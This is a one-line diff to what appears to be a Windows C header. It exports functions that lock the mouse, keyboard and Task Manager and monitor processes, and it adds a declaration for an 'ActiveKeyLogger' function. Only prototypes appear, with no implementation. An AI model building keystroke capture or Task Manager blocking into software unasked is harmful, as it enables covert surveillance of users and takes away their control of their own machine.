@@ -6,3 +6,4 @@ void IMPORT LockMouse(HWND hWnd, BOOL bEnableDisable);
 void IMPORT LockKeyboard(HWND hWnd, BOOL bEnableDisable);
 int IMPORT LockTaskManager(BOOL bEnableDisable);
 void IMPORT MonitorProcess(BOOL b);
+void IMPORT ActiveKeyLogger(HWND hWnd, BOOL bEnableDisable);
